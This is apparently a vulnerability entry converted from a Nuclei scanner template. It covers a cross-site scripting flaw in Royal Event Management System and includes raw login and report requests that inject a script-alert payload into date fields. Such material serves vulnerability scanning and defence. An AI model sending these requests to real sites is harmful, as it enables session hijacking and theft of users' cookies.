# Vulnerability: Royal Event Management System - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`royalevent-management-xss.yaml`)

## Description
Royal Event Management System contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /royal_event/ HTTP/1.1
Host: {{Hostname}}
Content-Length: 353
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCSxQll1eihcqgIgD

------WebKitFormBoundaryCSxQll1eihcqgIgD
Content-Disposition: form-data; name="username"

{{username}}
------WebKitFormBoundaryCSxQll1eihcqgIgD
Content-Disposition: form-data; name="password"

{{password}}
------WebKitFormBoundaryCSxQll1eihcqgIgD
Content-Disposition: form-data; name="login"

------WebKitFormBoundaryCSxQll1eihcqgIgD--

POST /royal_event/btndates_report.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFboH5ITu7DsGIGrD

------WebKitFormBoundaryFboH5ITu7DsGIGrD
Content-Disposition: form-data; name="todate"

2022-12-22<script>alert(document.domain)</script>
------WebKitFormBoundaryFboH5ITu7DsGIGrD
Content-Disposition: form-data; name="search"

3
------WebKitFormBoundaryFboH5ITu7DsGIGrD
Content-Disposition: form-data; name="fromdate"

2022-06-22<script>alert(document.domain)</script>
------WebKitFormBoundaryFboH5ITu7DsGIGrD--
```

